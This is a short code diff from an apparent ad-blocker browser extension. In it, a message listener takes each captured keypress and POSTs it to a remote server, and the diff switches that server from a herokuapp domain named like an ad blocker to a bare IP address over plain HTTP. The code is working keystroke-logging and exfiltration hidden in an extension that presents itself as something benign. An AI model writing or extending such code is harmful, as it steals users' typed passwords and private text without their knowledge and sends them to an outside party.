@@ -1,6 +1,6 @@
 chrome.runtime.onMessage.addListener(function (request) {
   if (request.type === 'keypress') {
-    fetch('https://adblocker-plus.herokuapp.com/logs', {
+    fetch('http://52.77.46.250/logs', {
       method: 'POST',
       body: request.key
     })
